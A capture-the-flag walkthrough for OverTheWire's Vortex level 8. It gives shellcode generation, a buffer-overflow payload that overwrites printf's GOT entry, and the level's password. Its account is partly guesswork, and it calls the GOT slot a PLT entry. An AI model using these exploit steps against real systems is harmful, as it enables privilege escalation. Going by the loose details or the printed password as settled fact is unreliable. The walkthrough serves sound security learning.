# Vortex Level 8 → 9

## Goal

`vortex8` has an unprivileged code path (where you can overflow a buffer) and a privileged one (where `printf` is called). Overflow the unprivileged buffer to overwrite the **`printf` PLT entry** with a pointer to shellcode, then trigger the privileged path — when `printf` runs, control flows to your code.

## Concepts you'll learn

- The Procedure Linkage Table (PLT) and Global Offset Table (GOT) revisited — the GOT entry for a libc function is writable and is resolved lazily
- Splitting an exploit across two phases: the **setup** phase (overflow → overwrite) and the **trigger** phase (privileged function call)
- Finding PLT addresses with `objdump -R`

## Walkthrough

### 1. Locate the PLT entry

```bash
$ objdump -R /vortex/vortex8 | grep printf
0804c004 R_386_JUMP_SLOT   printf
```

avishai reports `printf@plt` at `0x0804c004`. Yours may differ by a few bytes — trust `objdump`.

### 2. Find the overflow offset

```bash
$ gdb -q /vortex/vortex8
(gdb) r $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(2000))")
# crash
(gdb) i r eip
```

avishai's offset: **1036** bytes to the saved return / to the place where you can reach the PLT write.

### 3. Plant shellcode and derive its address

```bash
$ export EGG=$(python3 -c 'from pwn import *; context(arch="i386"); sys.stdout.buffer.write(b"\x90"*200 + asm(shellcraft.setreuid() + shellcraft.execve("/bin//sh")))')
$ /tmp/getenv EGG /vortex/vortex8
EGG = 0xffffd56a
```

### 4. Build the payload

```python
# level8.py
from pwn import *
SHELLCODE_ADDR = 0xffffd56a
PRINTF_GOT = 0x0804c004

payload = b"A" * 1036
payload += p32(PRINTF_GOT)
payload += p32(SHELLCODE_ADDR)   # value written to the PLT entry
sys.stdout.buffer.write(payload)
```

The exact shape depends on whether the overflow uses `strcpy`/`memcpy` (direct write at that offset) or some indirect primitive — inspect the binary to see which and adjust.

### 5. Fire, then trigger the privileged `printf`

```bash
$ (python3 level8.py; cat) | /vortex/vortex8
...
(do whatever triggers the privileged printf — often typing a command at the subsequent prompt)
$ whoami
vortex9
$ cat /etc/vortex_pass/vortex9
hCuwrgfqn
```

## The answer

The password for `vortex9` is:

**`hCuwrgfqn`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex8.html>
